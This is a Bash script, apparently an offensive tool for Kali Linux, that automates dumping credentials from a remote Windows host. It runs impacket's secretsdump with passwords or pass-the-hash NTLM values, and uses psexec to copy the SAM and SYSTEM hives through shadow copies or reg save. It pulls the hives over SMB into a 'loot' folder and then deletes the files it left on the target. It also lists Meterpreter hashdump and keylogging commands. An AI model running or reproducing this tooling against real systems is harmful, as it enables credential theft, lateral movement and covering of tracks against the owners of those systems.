#!/bin/bash

# Advanced Remote Windows Hash Extractor for Kali Linux
# Author: Michael van STtden
# Purpose: Automates hash extraction and related tasks from a Windows target.
# Requires: impacket suite, smbclient, admin creds or hash, network access

function main_menu() {
    echo "==== Windows Remote Credential Extraction Menu ===="
    echo "1. Dump hashes remotely using secretsdump.py (SMB/RPC)"
    echo "2. Create shadow copy & extract SAM/SYSTEM remotely"
    echo "3. Save SAM/SYSTEM from registry remotely"
    echo "4. Metasploit hashdump/keylogger guidance"
    echo "5. Exit"
    echo "=================================================="
    read -p "Select an option [1-5]: " CHOICE
}

function get_creds() {
    read -p "Target IP/Hostname: " TARGET
    read -p "Domain (or leave blank for local): " DOMAIN
    read -p "Username: " USER
    echo "Choose authentication method:"
    echo "1. Password"
    echo "2. NTLM Hash"
    read -p "[1/2]: " AUTH_METHOD
    if [ "$AUTH_METHOD" == "1" ]; then
        read -s -p "Password: " PASS
        echo
        CREDS="${DOMAIN:+$DOMAIN/}$USER:$PASS@$TARGET"
        HASHMODE=0
    else
        read -p "LMHASH (leave blank for empty): " LMHASH
        read -p "NTHASH: " NTHASH
        HASH="${LMHASH:-00000000000000000000000000000000}:${NTHASH}"
        CREDS="${DOMAIN:+$DOMAIN/}$USER@$TARGET -hashes $HASH"
        HASHMODE=1
    fi
}

function run_secretsdump() {
    get_creds
    echo "[*] Running secretsdump.py (impacket)..."
    if [ "$HASHMODE" == "0" ]; then
        secretsdump.py $CREDS
    else
        secretsdump.py $CREDS
    fi
}

function run_shadowcopy_extract() {
    get_creds

    # We will use psexec.py to run commands remotely to create a shadow copy and copy files to a share
    TMPDIR="C:\Windows\Temp\winenum"
    SCRIPTCMD="if not exist $TMPDIR mkdir $TMPDIR"
    SCRIPTCMD+=" & wmic shadowcopy call create Volume='C:\\'"
    SCRIPTCMD+=" & vssadmin list shadows > $TMPDIR\\shadows.txt"
    SCRIPTCMD+=" & for /f \"tokens=4\" %A in ('findstr /i \"Shadow Copy Volume:\" $TMPDIR\\shadows.txt') do set SHADOW=%A"
    SCRIPTCMD+=" & copy \"%SHADOW%\\Windows\\System32\\config\\SAM\" $TMPDIR\\SAM"
    SCRIPTCMD+=" & copy \"%SHADOW%\\Windows\\System32\\config\\SYSTEM\" $TMPDIR\\SYSTEM"
    SCRIPTCMD+=" & echo Done"

    echo "[*] Creating shadow copy and copying SAM/SYSTEM on target..."
    psexec.py $CREDS "$SCRIPTCMD"

    # Now, download the files via smbclient
    echo "[*] Downloading files via smbclient..."
    mkdir -p ./loot
    smbclient -U "$USER%$PASS" "//$TARGET/C$/Windows/Temp/winenum" -c "get SAM ./loot/SAM; get SYSTEM ./loot/SYSTEM; get shadows.txt ./loot/shadows.txt" 2>/dev/null

    if [[ -f ./loot/SAM && -f ./loot/SYSTEM ]]; then
        echo "[+] Files downloaded. Running secretsdump.py locally..."
        secretsdump.py -sam ./loot/SAM -system ./loot/SYSTEM LOCAL
    else
        echo "[!] Could not download SAM/SYSTEM. Check credentials or permissions."
    fi

    # Clean up files from target (optional)
    echo "[*] Cleaning up temporary files on target..."
    psexec.py $CREDS "del $TMPDIR\\SAM & del $TMPDIR\\SYSTEM & del $TMPDIR\\shadows.txt & rmdir $TMPDIR"
}

function run_registry_save() {
    get_creds

    TMPDIR="C:\Windows\Temp\winenum"
    SCRIPTCMD="if not exist $TMPDIR mkdir $TMPDIR"
    SCRIPTCMD+=" & reg save HKLM\\SAM $TMPDIR\\SAM-REG /y"
    SCRIPTCMD+=" & reg save HKLM\\SYSTEM $TMPDIR\\SYSTEM-REG /y"
    SCRIPTCMD+=" & echo Done"

    echo "[*] Saving SAM and SYSTEM registry hives on target..."
    psexec.py $CREDS "$SCRIPTCMD"

    echo "[*] Downloading reg hives via smbclient..."
    mkdir -p ./loot
    smbclient -U "$USER%$PASS" "//$TARGET/C$/Windows/Temp/winenum" -c "get SAM-REG ./loot/SAM-REG; get SYSTEM-REG ./loot/SYSTEM-REG" 2>/dev/null

    if [[ -f ./loot/SAM-REG && -f ./loot/SYSTEM-REG ]]; then
        echo "[+] Registry hives downloaded. Running secretsdump.py locally..."
        secretsdump.py -sam ./loot/SAM-REG -system ./loot/SYSTEM-REG LOCAL
    else
        echo "[!] Could not download registry hives. Check credentials or permissions."
    fi

    # Clean up files from target (optional)
    echo "[*] Cleaning up temporary files on target..."
    psexec.py $CREDS "del $TMPDIR\\SAM-REG & del $TMPDIR\\SYSTEM-REG & rmdir $TMPDIR"
}

function metasploit_guidance() {
    echo "==== Metasploit Keylogger/Hashdump Guidance ===="
    echo "1. Use Metasploit to get a Meterpreter shell on the target."
    echo "2. Run these Meterpreter commands:"
    echo "   > hashdump"
    echo "   > keyscan_start"
    echo "   > keyscan_dump"
    echo "   > keyscan_stop"
    echo " "
    echo "To automate with msfconsole, see relevant Metasploit documentation."
    echo "==============================================="
}

# Main Loop
while true; do
    main_menu
    case $CHOICE in
        1) run_secretsdump ;;
        2) run_shadowcopy_extract ;;
        3) run_registry_save ;;
        4) metasploit_guidance ;;
        5) echo "Bye!"; exit 0 ;;
        *) echo "[!] Invalid option." ;;
    esac
    echo ""
done
